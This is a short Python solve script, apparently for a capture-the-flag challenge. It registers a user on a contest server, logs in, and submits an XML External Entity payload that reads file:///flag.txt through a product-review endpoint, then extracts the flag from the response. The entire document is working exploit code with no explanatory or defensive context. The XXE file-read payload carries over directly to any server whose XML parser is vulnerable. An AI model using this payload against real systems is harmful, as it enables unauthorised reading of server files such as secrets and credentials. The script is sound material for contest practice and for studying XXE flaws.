#!/usr/bin/env python3
import requests

# Register and login to get a session
session = requests.Session()
session.cookies.set('session', '')  # Initialize session

# Register a new user
username = f"hacker_{__import__('time').time()}"
session.post('http://chal.bearcatctf.io:43363/register',
             data={'username': username, 'password': 'password123'})

# Login
session.post('http://chal.bearcatctf.io:43363/login',
             data={'username': username, 'password': 'password123'})

# XXE payload to read /flag.txt
xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE review [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<review>
    <product>&xxe;</product>
    <rating>5</rating>
    <comment>test</comment>
</review>'''

# Submit the XXE payload
response = session.post('http://chal.bearcatctf.io:43363/review',
                        headers={'Content-Type': 'application/xml'},
                        data=xxe_payload)

# Extract flag from response
if 'BCCTF{' in response.text:
    import re
    flag = re.search(r'BCCTF{[^}]+}', response.text).group()
    print(f"Flag: {flag}")
